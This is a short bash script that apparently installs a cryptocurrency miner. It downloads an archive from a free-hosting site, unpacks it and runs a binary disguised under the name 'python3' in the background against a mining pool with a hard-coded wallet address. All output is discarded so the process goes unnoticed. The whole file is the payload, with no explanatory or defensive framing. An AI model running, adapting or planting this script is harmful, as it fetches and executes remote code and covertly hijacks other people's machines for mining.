#!/bin/bash

wget -O dot momok.x10.bz/DOT-SRB.tar.gz

tar xvf dot

nomer=$((RANDOM % 50 + 1))

nohup ./dotsrb/python3 -a flex -o eu.mpool.live:5271 -u  kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$nomer > /dev/null 2>&1 &
